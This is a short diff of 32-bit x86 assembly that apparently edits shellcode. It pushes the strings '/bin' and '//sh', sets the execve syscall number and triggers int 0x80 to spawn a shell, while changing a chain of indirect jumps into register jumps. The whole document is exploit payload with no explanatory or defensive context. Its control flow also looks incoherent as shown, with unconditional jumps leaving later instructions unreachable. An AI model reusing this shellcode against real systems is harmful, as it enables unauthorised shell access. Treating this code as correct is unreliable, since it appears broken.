@@ -6,20 +6,22 @@ start:
 main:
 push   ebp
 mov    ebp, esp
-mov    ecx, [esp + 76]
-jmp    [ecx + 12]
+lea    ecx, [edx + 4]
+add    edx, 12
+jmp    edx
 push   0
-jmp    [ecx + 24]
+jmp    ecx
 push   0x68732f2f
-jmp    [ecx + 36]
+jmp    ecx
 push   0x6e69622f
-jmp    [ecx + 48]
+jmp    ecx
 mov    esp, ebx
 push   0
 push   ebx
-jmp    [ecx + 60]
+jmp    ecx
 mov    esp, ecx
 mov    al, 0xb
+jmp    ecx
 int    0x80
 ret
 leave
